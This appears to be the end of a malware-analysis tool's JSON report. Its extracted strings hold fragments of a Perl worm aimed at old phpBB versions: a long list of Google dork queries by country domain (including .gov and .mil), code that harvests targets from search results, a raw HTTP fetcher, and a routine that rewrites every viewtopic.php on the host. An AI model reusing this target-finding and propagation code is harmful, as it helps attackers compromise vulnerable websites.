            "\"%22inurl%3A%22.tw%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.cn%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.hk%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.se%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ar%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.at%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.uy%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.cz%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.kr%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.jp%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.dk%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.yu%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.info%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.gr%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.uk%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.pe%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.co%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ve%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.cl%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.py%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.bo%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ec%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.mx%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.fi%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.si%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ch%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.es%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.fr%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.br%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ru%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ro%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.biz%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ni%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.edu%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.gov%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.aero%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.mil%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.fm%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ie%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ir%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.hr%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.hu%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.za%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.pt%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.tz%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.tr%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.cc%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.it%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.au%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.nz%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ee%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.il%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.jm%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.lv%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.mg%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.lt%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ma%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.ws%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.tk%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.my%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.no%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.8%22\",",
            "\"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22inurl%3A%22.id%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.cx%22+%22phpbb%22%2B%222.0.6%22\",",
            "\"%22inurl%3A%22.nl%22+%22phpbb%22%2B%222.0.10%22\",",
            "\"%22welcome+to+phpbb+2%22%2B%22phpbb%22%2B%222.0.10%22\");",
            "    my $query=\"www.google.com/custom?hl=es&q=\";",
            "    $query.=$str[(rand(scalar(@str)))].$rnd;",
            "    $query.=\"+-modules&num=$n&start=$s\";",
            "    my @lst=();",
            "    my $page = http_query($query);",
            "    while ($page =~  m/<a href=\\\"?http:\\/\\/([^>\\\"]+)\\\"?>/g){",
            "\tif ($1 !~ m/google|cache|translate/){",
            "\t    push (@lst,$1);",
            "    }",
            "    return (@lst);",
            "sub http_query($){",
            "    my ($url) = @_;",
            "    my $host=$url;",
            "    my $query=$url;",
            "    my $page=\"\";",
            "    $host =~ s/href=\\\"?http:\\/\\///;",
            "    $host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;",
            "    $query =~s/$host//;",
            "    if ($query eq \"\") {$query=\"/\";};",
            "    eval {",
            "\tlocal $SIG{ALRM} = sub { die \"1\";};",
            "\talarm 10;",
            "\tmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;",
            "\tprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/4.0\\r\\n\\r\\n\";",
            "\tmy @r = <$sock>;",
            "\t$page=\"@r\";",
            "\talarm 0;",
            "\tclose($sock);",
            "    };    ",
            "    return $page;",
            "sub fix(){",
            "my @in=`find / -name  \"viewtopic.php\" 2>/dev/null`;",
            "foreach my $f (@in){",
            "    chop $f;",
            "    my $newvt=\"\";",
            "    if (open FIX,\"<$f\") {",
            "\twhile (<FIX>){",
            "\t    $newvt.=$_;",
            "\tclose FIX;",
            "\t$newvt =~ s/urldecode//;",
            "\tif (open FIX,\">$f\"){",
            "\t    print FIX $newvt;",
            "\t    close FIX;",
            "    }"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [
            "216.17.38.91"
        ],
        "url": []
    },
    "time": "0:00:00.433841",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
